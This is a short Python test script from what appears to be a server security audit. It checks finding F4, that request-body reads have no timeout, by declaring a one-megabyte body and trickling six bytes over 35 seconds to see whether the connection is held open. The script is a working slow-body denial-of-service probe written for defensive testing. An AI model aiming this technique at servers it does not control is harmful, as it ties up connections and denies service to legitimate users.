#!/usr/bin/env python3
"""F4: no timeout on request-body reads (and none on idle keep-alive).

The server's only timeout is `header_read_timeout` (30 s), which covers the
request head. A request that declares `Content-Length: 1000000` and then
trickles a few body bytes is held open forever: after 35 s (> the header
timeout, proving body reads are not covered) the connection is still open
with no response and no close. The same holds for idle keep-alive
connections. Combined with no cap on the number of connections, a few
clients can pin one connection (and its task) each indefinitely.

Expect (fixed): a body-read/idle timeout closes the connection.
"""
import socket
import sys
import time

from lib import connect, get, port_arg, report, status_of

port = port_arg(sys.argv)
wait = float(sys.argv[2]) if len(sys.argv) > 2 else 35.0
s = connect(port, timeout=wait + 10)
s.sendall(
    b"POST /post.php HTTP/1.1\r\nHost: x\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 1000000\r\n\r\n"
)
for _ in range(6):
    s.sendall(b"a")
    time.sleep(wait / 6.0)
s.settimeout(2)
held = None
try:
    r = s.recv(100)
    held = r == b""  # clean close
    if not held:
        held = "responded"
except socket.timeout:
    held = True  # still open, no response, no close
s.close()
control = status_of(get(port, "/hello.php"))[0]
vulnerable = held is True and control == 200
sys.exit(
    report(
        "slow body (6 of 1000000 bytes over 35s)",
        vulnerable,
        f"after {wait:.0f}s the connection is still open with no response and no "
        f"close (held={held!r}); control request meanwhile: {control}",
    )
)
